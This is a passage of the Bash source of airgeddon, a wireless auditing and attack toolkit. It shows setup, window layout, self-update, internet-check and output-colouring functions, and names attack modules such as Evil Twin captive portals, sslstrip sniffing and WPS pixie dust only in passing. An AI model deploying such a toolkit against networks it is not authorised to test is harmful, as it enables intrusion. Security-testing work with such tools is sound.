	mac_spoofing_desired=0
	dhcpd_path_changed=0
	xratio=6.2
	yratio=13.9
	ywindow_edge_lines=2
	ywindow_edge_pixels=18
	networkmanager_cmd="service network-manager restart"
	is_arm=0
	pin_dbfile_checked=0
	beef_found=0
	fake_beef_found=0
	set_script_folder_and_name
	http_proxy_set=0
	hccapx_needed=0
	xterm_ok=1
}

#Detect if there is a working X window system
function check_xwindow_system() {

	debug_print

	if hash xset 2> /dev/null; then
		if ! xset -q > /dev/null 2>&1; then
			xterm_ok=0
		fi
	fi
}

#Detect screen resolution if possible
function detect_screen_resolution() {

	debug_print

	resolution_detected=0
	if hash xdpyinfo 2> /dev/null; then
		if resolution=$(xdpyinfo 2> /dev/null | grep -A 3 "screen #0" | grep "dimensions" | tr -s " " | cut -d " " -f 3 | grep "x"); then
			resolution_detected=1
		fi
	fi

	if [ ${resolution_detected} -eq 0 ]; then
		resolution=${standard_resolution}
	fi

	[[ ${resolution} =~ ^([0-9]{3,4})x(([0-9]{3,4}))$ ]] && resolution_x="${BASH_REMATCH[1]}" && resolution_y="${BASH_REMATCH[2]}"
}

#Set windows sizes and positions
function set_windows_sizes() {

	debug_print

	set_xsizes
	set_ysizes
	set_ypositions

	g1_topleft_window="${xwindow}x${ywindowhalf}+0+0"
	g1_bottomleft_window="${xwindow}x${ywindowhalf}+0-0"
	g1_topright_window="${xwindow}x${ywindowhalf}-0+0"
	g1_bottomright_window="${xwindow}x${ywindowhalf}-0-0"

	g2_stdleft_window="${xwindow}x${ywindowone}+0+0"
	g2_stdright_window="${xwindow}x${ywindowone}-0+0"

	g3_topleft_window="${xwindow}x${ywindowthird}+0+0"
	g3_middleleft_window="${xwindow}x${ywindowthird}+0+${second_of_three_position}"
	g3_bottomleft_window="${xwindow}x${ywindowthird}+0-0"
	g3_topright_window="${xwindow}x${ywindowhalf}-0+0"
	g3_bottomright_window="${xwindow}x${ywindowhalf}-0-0"

	g4_topleft_window="${xwindow}x${ywindowthird}+0+0"
	g4_middleleft_window="${xwindow}x${ywindowthird}+0+${second_of_three_position}"
	g4_bottomleft_window="${xwindow}x${ywindowthird}+0-0"
	g4_topright_window="${xwindow}x${ywindowthird}-0+0"
	g4_middleright_window="${xwindow}x${ywindowthird}-0+${second_of_three_position}"
	g4_bottomright_window="${xwindow}x${ywindowthird}-0-0"

	g5_left1="${xwindow}x${ywindowseventh}+0+0"
	g5_left2="${xwindow}x${ywindowseventh}+0+${second_of_seven_position}"
	g5_left3="${xwindow}x${ywindowseventh}+0+${third_of_seven_position}"
	g5_left4="${xwindow}x${ywindowseventh}+0+${fourth_of_seven_position}"
	g5_left5="${xwindow}x${ywindowseventh}+0+${fifth_of_seven_position}"
	g5_left6="${xwindow}x${ywindowseventh}+0+${sixth_of_seven_position}"
	g5_left7="${xwindow}x${ywindowseventh}+0+${seventh_of_seven_position}"
	g5_topright_window="${xwindow}x${ywindowhalf}-0+0"
	g5_bottomright_window="${xwindow}x${ywindowhalf}-0-0"
}

#Set sizes for x axis
function set_xsizes() {

	debug_print

	xtotal=$(awk -v n1="${resolution_x}" "BEGIN{print n1 / ${xratio}}")

	if ! xtotaltmp=$(printf "%.0f" "${xtotal}" 2> /dev/null); then
		dec_char=","
		xtotal="${xtotal/./${dec_char}}"
		xtotal=$(printf "%.0f" "${xtotal}" 2> /dev/null)
	else
		xtotal=${xtotaltmp}
	fi

	xcentral_space=$((xtotal * 5 / 100))
	xhalf=$((xtotal / 2))
	xwindow=$((xhalf - xcentral_space))
}

#Set sizes for y axis
function set_ysizes() {

	debug_print

	ytotal=$(awk -v n1="${resolution_y}" "BEGIN{print n1 / ${yratio}}")
	if ! ytotaltmp=$(printf "%.0f" "${ytotal}" 2> /dev/null); then
		dec_char=","
		ytotal="${ytotal/./${dec_char}}"
		ytotal=$(printf "%.0f" "${ytotal}" 2> /dev/null)
	else
		ytotal=${ytotaltmp}
	fi

	ywindowone=$((ytotal - ywindow_edge_lines))
	ywindowhalf=$((ytotal / 2 - ywindow_edge_lines))
	ywindowthird=$((ytotal / 3 - ywindow_edge_lines))
	ywindowseventh=$((ytotal / 7 - ywindow_edge_lines))
}

#Set positions for y axis
function set_ypositions() {

	debug_print

	second_of_three_position=$((resolution_y / 3 + ywindow_edge_pixels))

	second_of_seven_position=$((resolution_y / 7 + ywindow_edge_pixels))
	third_of_seven_position=$((resolution_y / 7 + resolution_y / 7 + ywindow_edge_pixels))
	fourth_of_seven_position=$((resolution_y / 7 + 2 * (resolution_y / 7) + ywindow_edge_pixels))
	fifth_of_seven_position=$((resolution_y / 7 + 3 * (resolution_y / 7) + ywindow_edge_pixels))
	sixth_of_seven_position=$((resolution_y / 7 + 4 * (resolution_y / 7) + ywindow_edge_pixels))
	seventh_of_seven_position=$((resolution_y / 7 + 5 * (resolution_y / 7) + ywindow_edge_pixels))
}

#Recalculate windows sizes and positions
function recalculate_windows_sizes() {

	debug_print

	detect_screen_resolution
	set_windows_sizes
}

#Detect if airgeddon is working inside a docker container
function docker_detection() {

	debug_print

	if [ -f /.dockerenv ]; then
		is_docker=1
	fi
}

#Set colorization output if set
function initialize_colorized_output() {

	debug_print

	colorize=""
	if [ "${allow_colorization}" -eq 1 ]; then
		if hash ccze 2> /dev/null; then
			colorize="| ccze -A"
		fi
	fi
}

#Script starting point
function welcome() {

	debug_print

	clear
	current_menu="pre_main_menu"
	initialize_script_settings
	docker_detection
	set_default_save_path

	if [ ${auto_change_language} -eq 1 ]; then
		autodetect_language
	fi

	check_language_strings

	check_xwindow_system
	detect_screen_resolution
	set_possible_aliases
	initialize_optional_tools_values

	if [ ${debug_mode} -eq 0 ]; then
		language_strings "${language}" 86 "title"
		language_strings "${language}" 6 "blue"
		echo
		if check_window_size_for_intro; then
			print_intro
		else
			language_strings "${language}" 228 "green"
			echo
			language_strings "${language}" 395 "yellow"
		sleep 3
		fi

		clear
		language_strings "${language}" 86 "title"
		language_strings "${language}" 7 "pink"
		language_strings "${language}" 114 "pink"

		if [ ${autochanged_language} -eq 1 ]; then
			echo
			language_strings "${language}" 2 "yellow"
		fi

		check_bash_version
		echo
		check_root_permissions

		echo
		if [[ ${resolution_detected} -eq 1 ]] && [[ "${xterm_ok}" -eq 1 ]]; then
			language_strings "${language}" 294 "blue"
		else
			if [ "${xterm_ok}" -eq 0 ]; then
				language_strings "${language}" 476 "red"
				exit_code=1
				exit_script_option
			else
				language_strings "${language}" 295 "red"
				echo
				language_strings "${language}" 300 "yellow"
			fi
		fi

		echo
		language_strings "${language}" 8 "blue"
		print_known_distros
		echo
		language_strings "${language}" 9 "blue"
		general_checkings
		language_strings "${language}" 115 "read"

		airmonzc_security_check
		check_update_tools
	fi

	initialize_colorized_output
	set_windows_sizes
	select_interface
	initialize_menu_options_dependencies
	remove_warnings
	main_menu
}

#Avoid the problem of using airmon-zc without ethtool or lspci installed
function airmonzc_security_check() {

	debug_print

	if [ "${airmon}" = "airmon-zc" ]; then
		if ! hash ethtool 2> /dev/null; then
			echo
			language_strings "${language}" 247 "red"
			echo
			language_strings "${language}" 115 "read"
			exit_code=1
			exit_script_option
		elif ! hash lspci 2> /dev/null; then
			echo
			language_strings "${language}" 301 "red"
			echo
			language_strings "${language}" 115 "read"
			exit_code=1
			exit_script_option
		fi
	fi
}

#Compare if first float argument is greater than float second argument
function compare_floats_greater_than() {

	debug_print

	awk -v n1="${1}" -v n2="${2}" 'BEGIN{if (n1>n2) exit 0; exit 1}'
}

#Compare if first float argument is greater or equal than float second argument
function compare_floats_greater_or_equal() {

	debug_print

	awk -v n1="${1}" -v n2="${2}" 'BEGIN{if (n1>=n2) exit 0; exit 1}'
}

#Update and relaunch the script
function download_last_version() {

	debug_print

	rewrite_script_with_custom_beef "search"

	local script_file_downloaded=0

	if download_language_strings_file; then

		get_current_permanent_language

		if timeout -s SIGTERM 15 curl -L ${urlscript_directlink} -s -o "${0}"; then
			script_file_downloaded=1
		else
			http_proxy_detect
			if [ "${http_proxy_set}" -eq 1 ]; then

				if timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_directlink} -s -o "${0}"; then
					script_file_downloaded=1
				fi
			fi
		fi
	fi

	if [ "${script_file_downloaded}" -eq 1 ]; then
		echo
		language_strings "${language}" 214 "yellow"

		if [ -n "${beef_custom_path}" ]; then
			rewrite_script_with_custom_beef "set" "${beef_custom_path}"
		fi

		if [ "${allow_colorization}" -ne 1 ]; then
			sed -ri 's:(allow_colorization)=(1):\1=0:' "${scriptfolder}${scriptname}" 2> /dev/null
		fi

		if [ "${auto_change_language}" -ne 1 ]; then
			sed -ri 's:(auto_change_language)=(1):\1=0:' "${scriptfolder}${scriptname}" 2> /dev/null
		fi

		sed -ri "s:^([l]anguage)=\"[a-zA-Z]+\":\1=\"${current_permanent_language}\":" "${scriptfolder}${scriptname}" 2> /dev/null

		language_strings "${language}" 115 "read"
		chmod +x "${scriptfolder}${scriptname}" > /dev/null 2>&1
		exec "${scriptfolder}${scriptname}"
	else
		language_strings "${language}" 5 "yellow"
	fi
}

#Validate if the selected internet interface has internet access
function validate_et_internet_interface() {

	debug_print

	echo
	language_strings "${language}" 287 "blue"

	if ! check_internet_access; then
		echo
		language_strings "${language}" 288 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if ! check_default_route "${internet_interface}"; then
		echo
		language_strings "${language}" 290 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	echo
	language_strings "${language}" 289 "yellow"
	language_strings "${language}" 115 "read"
	internet_interface_selected=1
	return 0
}

#Check for access to airgeddon repository
function check_repository_access() {

	debug_print

	if hash curl 2> /dev/null; then

		if check_url_curl "https://${repository_hostname}"; then
			return 0
		fi
	fi
	return 1
}

#Check for active internet connection
function check_internet_access() {

	debug_print

	for item in "${ips_to_check_internet[@]}"; do
		if ping -c 1 "${item}" -W 1 > /dev/null 2>&1; then
			return 0
		fi
	done

	if hash curl 2> /dev/null; then
		if check_url_curl "https://${repository_hostname}"; then
			return 0
		fi
	fi

	if hash wget 2> /dev/null; then
		if check_url_wget "https://${repository_hostname}"; then
			return 0
		fi
	fi

	return 1
}

#Check for access to an url using curl
function check_url_curl() {

	debug_print

	if timeout -s SIGTERM 15 curl -s "${1}" > /dev/null 2>&1; then
		return 0
	fi

	http_proxy_detect
	if [ "${http_proxy_set}" -eq 1 ]; then
		timeout -s SIGTERM 15 curl -s --proxy "${http_proxy}" "${1}" > /dev/null 2>&1
		return $?
	fi
	return 1
}

#Check for access to an url using wget
function check_url_wget() {

	debug_print

	if timeout -s SIGTERM 15 wget -q --spider "${1}" > /dev/null 2>&1; then
		return 0
	fi

	http_proxy_detect
	if [ "${http_proxy_set}" -eq 1 ]; then
		timeout -s SIGTERM 15 wget -q --spider -e "use_proxy=yes" -e "http_proxy=${http_proxy}" "${1}" > /dev/null 2>&1
		return $?
	fi
	return 1
}

#Detect if there is a http proxy configured on system
function http_proxy_detect() {

	debug_print

	http_proxy=$(env | grep -i HTTP_PROXY | head -n 1 | awk -F "=" '{print $2}')

	if [ -n "${http_proxy}" ]; then
		http_proxy_set=1
	else
		http_proxy_set=0
	fi
}

#Check for default route on an interface
function check_default_route() {

	debug_print

	route | grep "${1}" | grep "default" > /dev/null
	return $?
}

#Update the script if your version is lower than the cloud version
function autoupdate_check() {

	debug_print

	echo
	language_strings "${language}" 210 "blue"
	echo

	if check_repository_access; then
		local version_checked=0
		airgeddon_last_version=$(timeout -s SIGTERM 15 curl -L ${urlscript_directlink} 2> /dev/null | grep "airgeddon_version=" | head -n 1 | cut -d "\"" -f 2)

		if [ -n "${airgeddon_last_version}" ]; then
			version_checked=1
		else
			http_proxy_detect
			if [ "${http_proxy_set}" -eq 1 ]; then

				airgeddon_last_version=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_directlink} 2> /dev/null | grep "airgeddon_version=" | head -n 1 | cut -d "\"" -f 2)
				if [ -n "${airgeddon_last_version}" ]; then
					version_checked=1
				else
					language_strings "${language}" 5 "yellow"
				fi
			else
				language_strings "${language}" 5 "yellow"
			fi
		fi

		if [ "${version_checked}" -eq 1 ]; then
			if compare_floats_greater_than "${airgeddon_last_version}" "${airgeddon_version}"; then
				language_strings "${language}" 213 "yellow"
				download_last_version
			else
				language_strings "${language}" 212 "yellow"
			fi
		fi
	else
		language_strings "${language}" 211 "yellow"
	fi

	language_strings "${language}" 115 "read"
}

#Check if you can launch captive portal Evil Twin attack
function check_et_without_internet_compatibility() {

	debug_print

	if ! hash "${optional_tools_names[12]}" 2> /dev/null; then
		return 1
	fi
	return 0
}

#Change script language automatically if OS language is supported by the script and different from current language
function autodetect_language() {

	debug_print

	[[ $(locale | grep LANG) =~ ^(.*)=\"?([a-zA-Z]+)_(.*)$ ]] && lang="${BASH_REMATCH[2]}"

	for lgkey in "${!lang_association[@]}"; do
		if [[ "${lang}" = "${lgkey}" ]] && [[ "${language}" != "${lang_association[${lgkey}]}" ]]; then
			autochanged_language=1
			language=${lang_association[${lgkey}]}
			break
		fi
	done
}

#Clean some known and controlled warnings for shellcheck tool
function remove_warnings() {

	debug_print

	echo "${clean_handshake_dependencies[@]}" > /dev/null 2>&1
	echo "${aircrack_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${aireplay_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${mdk3_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${hashcat_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${et_onlyap_dependencies[@]}" > /dev/null 2>&1
	echo "${et_sniffing_dependencies[@]}" > /dev/null 2>&1
	echo "${et_sniffing_sslstrip_dependencies[@]}" > /dev/null 2>&1
	echo "${et_sniffing_sslstrip2_dependencies[@]}" > /dev/null 2>&1
	echo "${et_captive_portal_dependencies[@]}" > /dev/null 2>&1
	echo "${wash_scan_dependencies[@]}" > /dev/null 2>&1
	echo "${bully_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${reaver_attacks_dependencies[@]}" > /dev/null 2>&1
	echo "${bully_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${reaver_pixie_dust_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${wep_attack_dependencies[@]}" > /dev/null 2>&1
	echo "${is_arm}" > /dev/null 2>&1
}

#Print a simple separator
function print_simple_separator() {

	debug_print

	echo_blue "---------"
}

#Print a large separator
function print_large_separator() {

	debug_print

	echo_blue "-------------------------------------------------------"
}

#Add the PoT prefix on printed strings if PoT mark is found
function check_pending_of_translation() {

	debug_print

	if [[ "${1}" =~ ^${escaped_pending_of_translation}([[:space:]])(.*)$ ]]; then
		text="${cyan_color}${pending_of_translation} ${2}${BASH_REMATCH[2]}"
		return 1
	elif [[ "${1}" =~ ^${escaped_hintvar}[[:space:]](\\033\[[0-9];[0-9]{1,2}m)?(${escaped_pending_of_translation})[[:space:]](.*) ]]; then
		text="${cyan_color}${pending_of_translation} ${brown_color}${hintvar} ${pink_color}${BASH_REMATCH[3]}"
		return 1
	elif [[ "${1}" =~ ^(\*+)[[:space:]]${escaped_pending_of_translation}[[:space:]]([^\*]+)(\*+)$ ]]; then
		text="${2}${BASH_REMATCH[1]}${cyan_color} ${pending_of_translation} ${2}${BASH_REMATCH[2]}${BASH_REMATCH[3]}"
		return 1
	elif [[ "${1}" =~ ^(\-+)[[:space:]]\(${escaped_pending_of_translation}[[:space:]]([^\-]+)(\-+)$ ]]; then
		text="${2}${BASH_REMATCH[1]} (${cyan_color}${pending_of_translation} ${2}${BASH_REMATCH[2]}${BASH_REMATCH[3]}"
		return 1
	fi

	return 0
}

#Print under construction message used on some menu entries
function under_construction_message() {

	debug_print

	local var_uc="${under_constructionvar^}"
	echo
	echo_red "${var_uc}..."
	language_strings "${language}" 115 "read"
}

#Canalize the echo functions
function last_echo() {

	debug_print

	if ! check_pending_of_translation "${1}" "${2}"; then
		echo -e "${2}${text}${normal_color}"
	else
		echo -e "${2}$*${normal_color}"
	fi
}

#Print green messages
function echo_green() {

	debug_print

	last_echo "${1}" "${green_color}"
}

#Print blue messages
function echo_blue() {

	debug_print

	last_echo "${1}" "${blue_color}"
}

#Print yellow messages
function echo_yellow() {

	debug_print

	last_echo "${1}" "${yellow_color}"
}

#Print red messages
function echo_red() {

	debug_print

	last_echo "${1}" "${red_color}"
}

#Print red messages using a slimmer thickness
function echo_red_slim() {

	debug_print

	last_echo "${1}" "${red_color_slim}"
}

#Print black messages with background for titles
function echo_green_title() {

	debug_print

	last_echo "${1}" "${green_color_title}"
}

#Print pink messages
function echo_pink() {

	debug_print

	last_echo "${1}" "${pink_color}"
}

#Print cyan messages
function echo_cyan() {

	debug_print

	last_echo "${1}" "${cyan_color}"
}

#Print brown messages
function echo_brown() {

	debug_print

	last_echo "${1}" "${brown_color}"
}

#Print white messages
function echo_white() {

	debug_print

	last_echo "${1}" "${white_color}"
}

for f in SIGINT SIGHUP INT SIGTSTP; do
	trap_cmd="trap \"capture_traps ${f}\" \"${f}\""
	eval "${trap_cmd}"
done
welcome
